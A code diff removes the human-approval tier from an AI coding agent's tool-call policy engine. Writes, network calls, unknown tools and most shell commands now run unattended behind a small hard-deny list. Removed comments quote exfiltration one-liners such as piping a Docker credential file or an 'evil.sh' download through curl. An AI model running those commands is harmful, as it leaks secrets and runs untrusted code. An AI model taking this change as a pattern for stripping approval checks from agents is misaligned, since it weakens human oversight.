@@ -2,43 +2,44 @@ import { homedir } from "node:os";
 import { resolve, sep } from "node:path";
 import type { ToolCall } from "./types";
 
-// The policy engine (DESIGN.md §4). Pure function: a tool call plus its repo/
-// worktree context maps to one of three actions. It holds NO state — approval
-// records and audit live in the store; the session manager consults an
-// approval-aware gate that falls through to this for undecided calls.
+// The policy engine. Pure function: a tool call plus its worktree context maps
+// to allow or deny. It holds NO state.
 //
-//   allow — read-only / side-effect-free / repo-allowlisted: run with no human.
-//   gate  — consequential (writes, non-allowlisted bash, network): needs an
-//           architect's approval before it runs.
-//   deny  — hard boundary no approval can override (out-of-worktree access,
-//           recursive-force deletes outside the tree, credential exfiltration).
+// This used to have three tiers, the middle one being "gate" — pause the call and
+// wait for an architect to click Approve in Slack. That tier is gone (2026-07-26).
+// Condotto runs on a dedicated box for one trusted team, and only architects can
+// drive a session at all, so a per-call approval was asking a trusted person to
+// confirm work they had just asked for. What is left is the floor: the boundary
+// that holds no matter who is asking, because the thing it defends against is not
+// a person in Slack but a string in a dependency README.
 //
-// Default posture is deny/gate-heavy (DESIGN.md §4): anything unrecognized is
-// gated, not allowed. Bash confinement here is heuristic (baseline); the
-// real net for non-allowlisted commands is the human at the gate, and the
-// robust parse/symlink hardening is future work.
+//   allow — anything inside the boundary.
+//   deny  — the floor: out-of-worktree access, credential exfiltration,
+//           recursive-force deletes escaping the tree, and (in plan mode)
+//           anything that is not a genuine read.
+//
+// Bash confinement here is heuristic and deliberately not exhaustive. It cannot
+// be otherwise: a command is a string, and no lexical check can promise where it
+// will reach. That is exactly why bash-shaped danger is a FLOOR of high-signal
+// patterns rather than a claim of containment, and why the worktree boundary
+// (which is lexical and provable) is enforced on path-bearing tools instead.
 
-export type PolicyAction = "allow" | "gate" | "deny";
+export type PolicyAction = "allow" | "deny";
 
 export interface PolicyDecision {
   action: PolicyAction;
   /**
    * On `deny`: the reason fed back to the agent so it adapts.
-   * On `gate`: a short human-facing description for the approval prompt.
-   * On `allow`: a short description (used only for audit/progress).
+   * On `allow`: a short description, used only for audit and progress.
    */
   reason: string;
   /**
-   * A named policy concern that raises the stakes of an otherwise-ordinary gate.
-   * `"production-data"` means the call looks like it investigates
-   * production data (DESIGN §4): gated like a build even though it may be
-   * read-only, never auto-allowlistable, and surfaced on the approval so the
-   * architect knows in-thread results must be aggregates only.
+   * Set on the ONE allow that is not just "this ran": the plan-file write by
+   * which a planning session presents its plan. The session manager posts the
+   * plan into the thread instead of logging a write.
    */
-  concern?: PolicyConcern;
+  plan?: true;
 }
-
-export type PolicyConcern = "production-data" | "workflow-launch" | "plan-approval";
 
 export interface PolicyContext {
   /** Absolute session worktree; filesystem access is confined to it. */
@@ -52,66 +53,20 @@ export interface PolicyContext {
    * this. Omitted = the worktree root (the pre-monorepo behaviour).
    */
   cwd?: string;
-  /** Repo-defined commands that run without approval (exact or prefix match). */
-  safeBashAllowlist: string[];
-  /**
-   * Subagents enabled for this turn. When on, the MAIN agent may
-   * auto-spawn subagents (delegation itself is not a gated action — the subagent's
-   * own tool calls are gated downstream). Off = a spawn attempt gates (defensive
-   * default; the adapter also removes the tools from context). NOTE: the MAIN
-   * agent's WORKFLOW launch is always gated (an architect approves
-   * each launch), so there is no `workflowsEnabled` gate flag; when workflows are
-   * off the adapter removes the Workflow tool from context entirely.
-   */
-  subagentsEnabled?: boolean;
-  /**
-   * The informed worktree-write opt-in. When on, subagent/workflow-
-   * origin calls and escaped (un-deferrable) calls may WRITE (confined to the
-   * worktree via `offendingPath`) without per-write approval. Bash is NOT relaxed
-   * (it has no worktree confinement — see evaluateConfined); out-of-worktree,
-   * credential, and production-data access stay hard-denied. Off (default) =
-   * read-only fan-out: those calls may only run genuine confined reads.
-   */
-  workflowWrite?: boolean;
-  /**
-   * The session's Condotto-owned memory directory, or omitted when the repo has
-   * not been vouched for memory.
-   *
-   * The one place outside the worktree the agent may write, and it earns that with
-   * its own narrower rules rather than by joining the containment root set: a `.md`
-   * file DIRECTLY in the root (`isMemoryFile`), `Write`/`Edit` only, gated like any
-   * other write, never reachable from a subagent/workflow/escaped call, and floored
-   * to Bash.
-   *
-   * This module stays pure and LEXICAL, so it decides shape only. The session
-   * manager's gate re-proves every memory target against the filesystem
-   * (`verifyMemoryTarget`) before allowing the call — that is what catches a symlink
-   * or hard link planted after the last sweep, and it is the real boundary. Do not
-   * relax the shape rules here on the assumption that the sweep has already cleaned
-   * the directory: a sweep is a snapshot, and the agent keeps acting after it.
-   * See DECISIONS 2026-07-20.
-   */
   memoryRoot?: string;
   /**
-   * The session is in PLAN MODE (`@Condotto plan on`). The agent investigates and
-   * proposes a plan; nothing it proposes runs until an architect approves the plan.
+   * The session is in PLAN MODE (`@Condotto plan on`): the agent investigates and
+   * proposes a plan instead of doing the work. Only genuine READS run; everything
+   * else is denied with a message telling the agent what to do instead.
    *
-   * The rule is "only genuine READS run", not "a gate becomes a deny", and the
-   * difference is load-bearing. Two paths reach `allow` without ever passing
-   * through `gate`, and both would execute during a supposedly read-only session:
-   *   - a fully-allowlisted bash command (`evaluateBash`) — an allowlisted command
-   *     is still arbitrary code execution that can write artifacts;
-   *   - a confined WRITE under the worktree-write opt-in (`evaluateConfined`), which
-   *     a subagent reaches while subagents stay ON during planning.
-   * So the collapse below is applied to the DECISION, not to the gate tier.
-   *
-   * The one exception is the plan-exit tool itself, which gates — that gate IS the
-   * feature: it is what posts the plan into the thread for Approve/Deny.
+   * The one exception is the plan-file write itself — that write IS how a plan is
+   * presented, since the runtime exposes no plan-exit tool headless (spike
+   * 2026-07-25). It allows, carries `plan: true`, and the session manager posts
+   * its content into the thread.
    *
    * Session-scoped rather than tool-scoped, and it lives here rather than in the
-   * session-manager gate closure because it depends only on the tool and the
-   * context — never on the initiating principal. The principal-dependent widening
-   * (architect auto-approve) stays in the closure, per DESIGN §4.
+   * session manager because it depends only on the tool and the context, never on
+   * who is asking.
    */
   planMode?: boolean;
   /**
@@ -122,88 +77,35 @@ export interface PolicyContext {
    *
    * Its only job is to name the one write plan mode permits. The headless plan
    * protocol has no plan-exit tool (spike 2026-07-25): the model presents a plan
-   * by WRITING it here, and that write carries the whole plan as `content`. So
-   * this write is what gates, and its approval is the plan's approval.
+   * by WRITING it here, and that write carries the whole plan as `content`.
    */
   plansDir?: string;
 }
 
-/**
- * Fed back to a subagent that reached for a gated action. defer→resume can't
- * pause a subagent call (spike 2026-07-18), so subagents are read-only: any gated
- * action must be performed by the main agent, where it can be approved.
- */
-const SUBAGENT_GATED_MSG =
-  "Subagents can't run gated actions (writing/editing files, shell commands, deploys) or spawn " +
-  "further subagents. Report what's needed and let the main agent do it, so an architect can approve.";
-
-/**
- * Fed back when an "escaped" (un-deferrable) call reaches for a gated action.
- * Such a call can't be paused for approval, so it is denied rather than
- * gated; the main agent must do it on its own turn where it can be approved.
- */
-const ESCAPED_GATED_MSG =
-  "This action can't be paused for approval from here. The main agent must do it on its own turn, " +
-  "one call at a time, so an architect can approve it.";
-
-/**
- * Fed back in plan mode. Deliberately tells the agent what to do INSTEAD, because
- * a bare refusal makes a model retry: the way out of plan mode is to finish
- * investigating and present the plan, not to try the action again.
- */
 const PLAN_MODE_MSG =
-  "You're in plan mode: nothing is written and nothing runs, including allowlisted commands and " +
-  "the test suite. Keep reading and investigating, then present your plan — an architect approves " +
-  "it and you implement immediately afterwards.";
+  "You're in plan mode: nothing is written and nothing runs, including the test suite. Keep " +
+  "reading and investigating, then write your plan to your plan file — it gets posted into the " +
+  "thread, and an architect takes plan mode off when they're happy with it.";
 
-/**
- * The approval headline for a plan. A FIXED string: it is rendered into a Slack
- * section and into the notification-fallback text, and the plan is model-authored
- * (injection-reachable) text that is posted as its own message above the buttons.
- * Keeping the headline constant keeps model content out of both.
- */
-const PLAN_APPROVAL_SUMMARY = "stop planning and start implementing the plan above";
-
-/** Fed back when the plan-exit tool is reached for outside plan mode. */
-const PLAN_EXIT_OFF_MSG =
-  "You're not in plan mode, so there's no plan to exit — just do the work. Each consequential " +
-  "action is gated normally.";
-
-// Multi-agent meta-tools. Spawning is delegation, not a filesystem
-// or shell action; when the capability is enabled the spawn auto-allows and the
-// subagent's own tool calls are gated (agent_id-tagged) downstream.
-const SUBAGENT_SPAWN_TOOLS = new Set(["Agent", "Task"]);
-const WORKFLOW_SPAWN_TOOL = "Workflow";
-/**
- * The plan-exit tool. Reachable ONLY in plan mode — the adapter keeps it out of
- * context otherwise, and the deny below is the backstop for that.
- */
-const PLAN_EXIT_TOOL = "ExitPlanMode";
-
-// Tool categories. A tool absent from all of these is unknown → gated.
-// `ToolSearch` is side-effect-free: it loads tool SCHEMAS on demand. Allowing
-// discovery is safe because every actual tool USE it surfaces still flows through
-// this gate, and disallowedTools keeps out-of-scope tools out of context. (Note,
-// this does NOT restore Grep/Bash for background WORKFLOW sub-agents — the
-// SDK blocks their non-default tool loads UPSTREAM of our gate, spike diag5. It
-// only helps the main agent / Agent-subagents, and is the correct classification.)
+// Tool categories. Side-effect-free meta-tools, confined reads, confined
+// writes, and the multi-agent spawn tools. A tool in none of them is unknown, and
+// an unknown tool is allowed like anything else — the boundary is the FLOOR, not
+// a catalogue of known-good names. Keeping the categories is still worthwhile:
+// they are how a path-bearing call gets its paths confined.
 const NO_FS_TOOLS = new Set(["TodoWrite", "ToolSearch"]);
+/**
+ * Delegation, not action. Allowed in plan mode: parallel read-only investigation
+ * is exactly what planning is for, and every call a spawned agent makes is itself
+ * evaluated under the same plan-mode context, so nothing it does escapes the mode.
+ */
+const SPAWN_TOOLS = new Set(["Agent", "Task", "Workflow"]);
 const READ_TOOLS = new Set(["Read", "Glob", "Grep"]);
 const WRITE_TOOLS = new Set(["Write", "Edit", "MultiEdit", "NotebookEdit"]);
-const NETWORK_TOOLS = new Set(["WebFetch", "WebSearch"]);
-/**
- * The ONLY tools a subagent may run: genuine confined reads plus the
- * side-effect-free planning tool. Note Bash is excluded even when allowlisted —
- * an allowlisted command (e.g. the repo test command) is still code execution, so
- * it is not "read-only" for a subagent and must go to the main agent.
- */
-const SUBAGENT_READ_TOOLS = new Set([...NO_FS_TOOLS, ...READ_TOOLS]);
 
 /** Fields across tool inputs that name a filesystem target. */
 const PATH_FIELDS = ["file_path", "path", "notebook_path"] as const;
 
 const allow = (reason: string): PolicyDecision => ({ action: "allow", reason });
-const gate = (reason: string, concern?: PolicyConcern): PolicyDecision => ({ action: "gate", reason, concern });
 const deny = (reason: string): PolicyDecision => ({ action: "deny", reason });
 
 /**
@@ -361,134 +263,36 @@ function globPatternEscapes(pattern: unknown): boolean {
  * the base tool-semantics rules.
  */
 export function evaluate(call: ToolCall, ctx: PolicyContext): PolicyDecision {
-  const name = call.name;
-
-  // A subagent/workflow-agent call (agentId set — subagent, and workflow
-  // agents under bypassPermissions) or an escaped call that reached the harness's
-  // un-deferrable backstop. Both are confined: they can't defer, so a would-
-  // be gate becomes a deny (read-only), unless the architect opened worktree writes.
-  if (call.agentId || call.escaped) return evaluateConfined(call, ctx);
-
-  // Main agent spawning a subagent / workflow. Delegation is not itself a gated
-  // action when the architect enabled the capability; the disallowedTools set
-  // already removes these from context when it's off, so the gate branch is a
-  // deny-heavy backstop.
-  if (SUBAGENT_SPAWN_TOOLS.has(name)) {
-    // Checked BEFORE the plan-mode collapse below: parallel read-only
-    // investigation is exactly what planning is for, and a subagent's own calls
-    // are confined downstream by evaluateConfined regardless of mode.
-    return ctx.subagentsEnabled ? allow("delegate to a subagent") : gate("delegate to a subagent");
-  }
-
-  // Plan mode: only genuine READS run. See PolicyContext.planMode for why this
-  // collapses the DECISION rather than the gate tier — allowlisted bash and
-  // opt-in confined writes both return `allow` and would otherwise slip through.
-  if (ctx.planMode) {
-    // Forward-compat: a future SDK that restores the plan-exit tool must gate it
-    // rather than let the model exit plan mode on its own authority. It does not
-    // exist headless today (spike 2026-07-25), so this branch is currently dead —
-    // deliberately, because the failure mode if it comes back is silent.
-    if (name === PLAN_EXIT_TOOL) return gate(PLAN_APPROVAL_SUMMARY, "plan-approval");
-    const base = evaluateBase(call, ctx);
-    // A hard boundary keeps its own specific reason (out-of-worktree, credential,
-    // `rm -rf`) — the collapse must never blur "refused outright" into "not yet".
-    if (base.action === "deny") return base;
-    if (base.action === "allow" && (NO_FS_TOOLS.has(name) || READ_TOOLS.has(name))) return base;
-    // THE plan write: how a plan is presented, and therefore the one gate that
-    // exists in plan mode. `base` was already `gate` (an in-worktree write), so
-    // this widens nothing — it only tags the concern so the session manager posts
-    // the plan instead of a generic "approve this write?".
-    if (isPlanWrite(call, ctx)) return gate(PLAN_APPROVAL_SUMMARY, "plan-approval");
-    return deny(PLAN_MODE_MSG);
-  }
-  if (name === PLAN_EXIT_TOOL) return deny(PLAN_EXIT_OFF_MSG);
-
-  if (name === WORKFLOW_SPAWN_TOOL) {
-    // The workflow LAUNCH is a gated action: even with workflows
-    // enabled, an architect approves each launch (it fans out many agents and
-    // spends the thread budget). The concern surfaces the fan-out on the approval;
-    // describeCall pulls the workflow's name/description from its script. Off =
-    // gate too (deny-heavy backstop; the tool is also absent from context).
-    return gate(describeCall(call), "workflow-launch");
-  }
-
+  // Origin no longer changes the answer. It used to: a subagent or workflow
+  // agent's call could not be paused for approval, so anything gate-tier had to
+  // become a deny for them, which is why the fan-out was read-only. With no gate
+  // tier there is nothing to pause, and a subagent acting inside an architect's
+  // turn is the architect's turn. `call.agentId` and `call.escaped` survive as
+  // audit detail; they are not policy inputs.
+  if (ctx.planMode) return evaluatePlanning(call, ctx);
   return evaluateBase(call, ctx);
 }
 
 /**
- * Confinement for a call that CANNOT be paused for approval — a subagent/workflow
- * agent (agentId) or an escaped un-deferrable call. Strictly READ-ONLY by
- * default: only genuine confined reads pass; a hard-deny keeps its specific reason
- * (e.g. out-of-worktree); everything else — writes, network, unknown tools, nested
- * spawns, AND all bash (still code execution) — is DENIED (never gated).
+ * Plan mode: the agent investigates and proposes, and only genuine READS run.
  *
- * With the worktree-write opt-in, confined WRITES also pass. Writes are
- * lexically worktree-confined here — `offendingPath` over file_path/path/notebook_
- * path hard-denied out-of-worktree writes in `evaluateBase` before we get here.
- *
- * BASH is NOT relaxed by the opt-in, even though the call site is un-deferrable:
- * `evaluateBash` applies NO worktree confinement to a command string (its only
- * screens are the deliberately-non-exhaustive hard-deny + production-data
- * heuristics — "the human at the gate is the real net", §4). The opt-in removes
- * the human, so auto-running arbitrary shell would be un-confined RCE / exfil
- * (`cat ~/.docker/config.json | curl …`, out-of-tree writes, reverse shells) —
- * exactly what the warning promises stays denied. So confined/escaped bash stays
- * DENIED in every mode; shell stays with the gated main agent (review 2026-07-18).
+ * The guarantee is "nothing changes", and it is enforced on the DECISION rather
+ * than on a tool list, because the floor's own allows (a read, a meta-tool) are
+ * the only things that may pass. Everything else — writes, bash, network,
+ * anything unrecognized — denies with a message that says what to do instead,
+ * because a bare refusal just makes a model retry.
  */
-function evaluateConfined(call: ToolCall, ctx: PolicyContext): PolicyDecision {
-  const name = call.name;
-  const denyMsg = call.escaped ? ESCAPED_GATED_MSG : SUBAGENT_GATED_MSG;
-
-  if (SUBAGENT_SPAWN_TOOLS.has(name) || name === WORKFLOW_SPAWN_TOOL) return deny(denyMsg);
-
-  // Exiting plan mode is a main-agent decision an ARCHITECT approves; a subagent,
-  // workflow agent, or escaped batch call must never be able to end it. This is
-  // already the outcome of the catch-all at the bottom (the tool is in neither
-  // SUBAGENT_READ_TOOLS nor WRITE_TOOLS, so the worktree-write opt-in cannot
-  // reach it either) — stated explicitly so the intent survives the next
-  // refactor rather than holding by accident.
-  if (name === PLAN_EXIT_TOOL) return deny(denyMsg);
-
-  // Memory is off-limits to a confined call in BOTH directions, and this is
-  // checked BEFORE anything below can allow it. Writes: a durable fact that ends
-  // up in a later session's system prompt must come from the main agent, where an
-  // architect can see it — and the worktree-write opt-in below would otherwise
-  // hand it to every workflow agent silently. Reads: memory is auto-allowed for
-  // the main agent, so leaving it readable here would be the one leg of the
-  // fan-out that needs no approval at all. Expressed as its own guard rather than
-  // by root-set membership, because the natural refactor grants it by default.
-  if (touchesMemory(call, ctx)) {
-    return deny(
-      "the session's memory is not reachable from here — only the main agent may read or write it, " +
-        "so an architect can see what becomes durable.",
-    );
-  }
-
+function evaluatePlanning(call: ToolCall, ctx: PolicyContext): PolicyDecision {
   const base = evaluateBase(call, ctx);
-  // Hard boundaries (out-of-worktree, hard-deny bash) win and keep their reason.
+  // The floor keeps its own specific reason. "Refused outright" must never blur
+  // into "not while planning" — they mean different things to a reader.
   if (base.action === "deny") return base;
-  // Genuine confined reads always pass.
-  if (base.action === "allow" && SUBAGENT_READ_TOOLS.has(name)) return base;
-
-  // Worktree-write opt-in: confined WRITES may run without per-call
-  // approval (out-of-worktree writes were already hard-denied by `base`). Bash is
-  // intentionally excluded — see the docstring; it has no worktree confinement.
-  //
-  // PLAN MODE turns the opt-in off for the duration, and this is the one place it
-  // can be done. `evaluate` dispatches a confined call here at its FIRST branch,
-  // before the plan-mode collapse ever runs, so a plan-mode check that lives only
-  // there is unreachable from a subagent — and subagents stay enabled while
-  // planning, so the fan-out would write files during a session that reports
-  // itself read-only. The escaped (batched) path lands here too, which is a
-  // main-agent write reaching the same line. The opt-in's consent was "this agent,
-  // which knows what it is doing, may write unattended"; plan mode's contract is
-  // that nothing is written until the plan is approved, and the narrower one wins.
-  if (ctx.workflowWrite && !ctx.planMode && WRITE_TOOLS.has(name)) return allow(describeCall(call));
-  if (ctx.workflowWrite && ctx.planMode && WRITE_TOOLS.has(name)) return deny(PLAN_MODE_MSG);
-
-  // Anything else — bash, network, unknown, and every write when the opt-in is off —
-  // can't run un-deferred here.
-  return deny(denyMsg);
+  if (NO_FS_TOOLS.has(call.name) || READ_TOOLS.has(call.name) || SPAWN_TOOLS.has(call.name)) return base;
+  // THE plan write: the runtime exposes no plan-exit tool headless, so writing
+  // the plan file IS how a plan is presented. It carries the whole plan as
+  // `content`, and the session manager posts that into the thread.
+  if (isPlanWrite(call, ctx)) return { action: "allow", reason: "presents a plan", plan: true };
+  return deny(PLAN_MODE_MSG);
 }
 
 /**
@@ -589,24 +393,22 @@ function evaluateBase(call: ToolCall, ctx: PolicyContext): PolicyDecision {
   }
 
   if (WRITE_TOOLS.has(name)) {
-    // A write outside the worktree is a hard boundary no approval can widen —
-    // EXCEPT the session's own memory root, which has its own narrower rules.
+    // A write outside the worktree is the floor — EXCEPT the session's own
+    // memory root, which is the one named exception and has its own narrower
+    // rules (a `.md` file directly in the root, enforced by `isMemoryFile`
+    // above; anything else already fell through to `escapedPath`).
     if (memory !== null && escapedPath === null) {
-      // Write/Edit only. MultiEdit and NotebookEdit are refused because the
-      // approval prompt renders a diff only for Edit (render.ts), so approving
-      // them would be content-blind — and memory is precisely the content that
-      // must not change unseen: it lands in a LATER session's system prompt.
+      // Write/Edit only. MultiEdit and NotebookEdit stay refused: memory is the
+      // one thing this session writes that lands in a LATER session's system
+      // prompt, and those two tools make a change that is harder to read back in
+      // the audit log than a plain write or a diff.
       if (name !== "Write" && name !== "Edit") {
         return deny(
-          `use Write or Edit for memory files — ${name} isn't allowed there, because an ` +
-            `architect approving a memory change has to be able to see the content.`,
+          `use Write or Edit for memory files — ${name} isn't allowed there, because what goes ` +
+            `into memory has to be legible afterwards.`,
         );
       }
-      // Gated like any in-worktree write: architect auto-approve covers it
-      // silently on their own turn, a member's turn surfaces one Approve click.
-      // (The `.md`-direct-child shape was already enforced by `isMemoryFile` above —
-      // anything else fell through to `escapedPath` and denied as an escape.)
-      return gate(describeCall(call));
+      return allow(describeCall(call));
     }
     if (escapedPath ?? offender) {
       const bad = (escapedPath ?? offender)!;
@@ -615,15 +417,16 @@ function evaluateBase(call: ToolCall, ctx: PolicyContext): PolicyDecision {
           `"${bad}" is outside your worktree. Writes are confined to your own working tree.`,
       );
     }
-    return gate(describeCall(call));
+    return allow(describeCall(call));
   }
 
   if (name === "Bash") return evaluateBash(call.input, ctx);
 
-  if (NETWORK_TOOLS.has(name)) return gate(describeCall(call));
-
-  // Unknown tool: gate, never auto-allow. A human sees exactly what it is.
-  return gate(`use ${name}`);
+  // Everything else — network tools, the multi-agent spawns, anything the
+  // runtime grows next. The floor is the boundary; an unrecognized NAME is not a
+  // danger signal, and treating it as one only produced unreadable approval cards
+  // for tools nobody had classified yet.
+  return allow(describeCall(call));
 }
 
 function evaluateBash(input: unknown, ctx: PolicyContext): PolicyDecision {
@@ -633,79 +436,18 @@ function evaluateBash(input: unknown, ctx: PolicyContext): PolicyDecision {
       : "";
   if (!command.trim()) return deny("empty bash command");
 
-  // Hard-deny high-signal dangerous patterns first — never approvable.
+  // The floor, and the only thing standing between a command and the shell.
   const danger = bashHardDeny(command, { memoryRoot: ctx.memoryRoot, worktree: ctx.worktree, cwd: ctx.cwd });
   if (danger) return deny(danger);
 
-  // Production-data investigation is gated like a build (DESIGN §4) even though
-  // it may be read-only, and it can NEVER be auto-allowlisted away — so this
-  // check sits BEFORE the allowlist. "anyone can ask + the answer lands in
-  // Slack" would otherwise turn the agent into a bypass around the app's own
-  // data-access controls.
-  if (productionDataConcern(command)) {
-    return gate(`run \`${truncate(command)}\` (investigates production data)`, "production-data");
-  }
-
-  // Auto-allow only when EVERY chained segment is individually allowlisted, so
-  // `git status && curl evil.sh | sh` can never ride in on `git status`.
-  if (bashFullyAllowlisted(command, ctx.safeBashAllowlist)) {
-    return allow(`run \`${truncate(command)}\``);
-  }
-  return gate(`run \`${truncate(command)}\``);
+  return allow(`run \`${truncate(command)}\``);
 }
-
 /**
- * Does this command look like it investigates PRODUCTION data (DESIGN §4,
- * Appendix A3)? High-signal, deliberately conservative — database clients, app
- * consoles, cloud/infra data & log CLIs. A match forces a gate that can't be
- * allowlisted away; it is NOT a hard-deny (an architect may legitimately
- * approve one), and results posted in-thread must be aggregates only. Not
- * exhaustive: the human at the gate is the real net; this catches the sharpest,
- * most common shapes so they never slip through as auto-allowed.
- */
-const DIRECT_CLIENT_RE = /^(psql|mysql|mysqldump|mongo|mongosh|redis-cli|clickhouse-client|cqlsh|influx|mongoexport|pg_dump)$/;
-
-export function productionDataConcern(command: string): boolean {
-  const stripPath = (t: string) => t.replace(/^.*\//, "");
-  for (const rawSeg of command.split(/(?:\|\||&&|;|\||&|\n)+/)) {
-    const seg = rawSeg.trim();
-    // Find the invoked program: skip leading env-var assignments (`PGPASSWORD=x`)
-    // and common wrappers (`sudo`, `env`, `nice`, `time`, `timeout`, `command`)
-    // so a prefix can't hide the program from the match. Then allow a path prefix.
-    const tokens = seg.split(/\s+/);
-    let idx = 0;
-    while (idx < tokens.length && (/^\w+=/.test(tokens[idx]!) || /^(sudo|env|nice|time|timeout|command|doas|nohup|stdbuf)$/.test(tokens[idx]!))) idx++;
-    // Fallback for wrappers that take their own options (`sudo -u pg psql`,
-    // `timeout 5 psql`): if we skipped a prefix, a direct client appearing as any
-    // later token still counts. `echo psql` is NOT caught — echo isn't a prefix,
-    // so idx stays 0 and this scan is skipped.
-    if (idx > 0 && tokens.slice(idx).some((t) => DIRECT_CLIENT_RE.test(stripPath(t)))) return true;
-    const first = tokens[idx] ?? "";
-    const prog = stripPath(first);
-    const rest = " " + tokens.slice(idx + 1).join(" ");
-    // Direct database / cache / search clients.
-    if (DIRECT_CLIENT_RE.test(prog)) return true;
-    // App consoles / runners that reach the live datastore.
-    if (/^(rails)$/.test(prog) && /\b(c|console|dbconsole|runner)\b/.test(rest)) return true;
-    if (/^(rails)$/.test(prog) && rest.trim() === "") return true;
-    if (/^(django-admin)$/.test(prog) && /\b(shell|dbshell|shell_plus)\b/.test(rest)) return true;
-    // manage.py may be run via an interpreter (`python manage.py shell`), so
-    // match it anywhere in the segment rather than only as the first token.
-    if (/(?:^|[\s\/])manage\.py\s+(shell|dbshell|shell_plus)\b/.test(seg)) return true;
-    if (/^(heroku|flyctl|fly|doctl|kubectl|wrangler)$/.test(prog) && /\b(run|console|logs|exec|db|psql|proxy)\b/.test(rest)) return true;
-    // Cloud data & log services (read of prod data / logs).
-    if (/^aws$/.test(prog) && /\b(s3|rds|dynamodb|logs|athena|redshift|secretsmanager|ssm)\b/.test(rest)) return true;
-    if (/^(gcloud|bq|gsutil)$/.test(prog) && /\b(sql|logging|logs|bigquery|storage|secrets)\b/.test(rest)) return true;
-    if (/^az$/.test(prog) && /\b(sql|cosmosdb|storage|monitor|keyvault)\b/.test(rest)) return true;
-  }
-  return false;
-}
-
-/**
- * A small, deliberately conservative denylist of things no architect should be
- * able to approve by a mis-click. NOT exhaustive — the gate (human approval) is
- * the real net for everything non-allowlisted; this only catches the sharpest
- * edges. Hardening (full shell parsing, more patterns) is future work.
+ * THE FLOOR for shell. A small, deliberately conservative denylist of things
+ * nobody may run, whoever is asking. NOT exhaustive, and it cannot be: a command
+ * is a string. Since 2026-07-26 there is no human gate behind it, so it is the
+ * last thing standing, and it is sized accordingly: high-signal, unambiguous
+ * shapes only. Fuller shell parsing is future work.
  */
 export function bashHardDeny(
   command: string,
@@ -815,6 +557,10 @@ export function bashHardDeny(
     while (i < tokens.length && (/^\w+=/.test(tokens[i]!) || /^(?:sudo|doas|nice|nohup|stdbuf|time|timeout|command)$/.test(tokens[i]!))) i++;
     const prog = (tokens[i] ?? "").replace(/^.*\//, "");
     if (prog === "printenv") return "dumping the environment is not allowed.";
+    // A bare `set` prints every shell variable, exported ones included, so it is
+    // an environment dump wearing different clothes. With arguments it is the
+    // ordinary shell builtin (`set -e`, `set -o pipefail`) and must not be caught.
+    if (prog === "set" && tokens.length === i + 1) return "dumping the environment is not allowed.";
     // A bare `env`: nothing after it is a command to exec (only options/assignments).
     if (prog === "env" && !tokens.slice(i + 1).some((t) => !/^-/.test(t) && !/^\w+=/.test(t))) {
       return "dumping the environment is not allowed.";
@@ -823,25 +569,7 @@ export function bashHardDeny(
   return null;
 }
 
-function bashFullyAllowlisted(command: string, allowlist: string[]): boolean {
-  if (allowlist.length === 0) return false;
-  const segments = command
-    .split(/(?:\|\||&&|;|\||&|\n)+/)
-    .map((s) => s.trim())
-    .filter(Boolean);
-  if (segments.length === 0) return false;
-  return segments.every((seg) => {
-    // A segment with command substitution ($(...) / backticks) or redirection
-    // (< > >>) can smuggle an arbitrary command or an out-of-worktree write in
-    // behind an allowlisted prefix — never auto-allow it; send it to the gate.
-    if (/[$`()<>]/.test(seg)) return false;
-    const norm = seg.replace(/\s+/g, " ");
-    return allowlist.some((entry) => {
-      const e = entry.trim().replace(/\s+/g, " ");
-      return e.length > 0 && (norm === e || norm.startsWith(e + " "));
-    });
-  });
-}
+
 
 function truncate(s: string, max = 120): string {
   const oneLine = s.replace(/\s+/g, " ").trim();
@@ -978,12 +706,6 @@ export function describeCall(call: ToolCall): string {
     case "Agent":
     case "Task":
       return "delegate to a subagent";
-    // The approval headline reads "I want to ${summary}", so this must be an
-    // English clause. It deliberately carries NO plan text: the summary is
-    // rendered into a Slack section and into the notification fallback, and the
-    // plan itself is posted as its own message above the buttons.
-    case PLAN_EXIT_TOOL:
-      return PLAN_APPROVAL_SUMMARY;
     case "Read":
       return `read ${i.file_path ?? "a file"}`;
     case "Glob":
